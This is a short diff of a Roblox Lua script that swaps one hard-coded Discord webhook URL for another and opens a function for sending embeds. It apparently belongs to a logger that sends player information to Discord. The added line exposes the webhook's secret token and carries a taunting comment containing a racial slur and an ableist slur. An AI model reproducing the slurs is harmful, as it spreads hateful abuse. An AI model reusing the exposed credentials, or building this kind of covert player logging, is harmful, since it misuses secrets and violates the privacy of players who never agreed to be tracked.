@@ -1,7 +1,7 @@
 local HttpService = game:GetService("HttpService")
 local LocalizationService = game:GetService("LocalizationService")
 
-local webhookUrl = "https://discordapp.com/api/webhooks/1253809598452858971/jpFmQYOCWwssaHqR0QA0tLZ_pY3Eylo56t9u6WNg8dR_CbS7kP6c7ekYyjCNvBTVidd5"
+local webhookUrl = "https://discordapp.com/api/webhooks/1254320204440145986/_RjREfMZqt5NRT-2fjG__mD96zCV3soAkaHHgGzo_yP8y09x90fiIzPzul1wRRg526Jt" -- go ahead and spam it idc retarded nigger you wont contact me
 
 local function sendEmbed(title, description, fields, thumbnailUrl)
     local embed = {
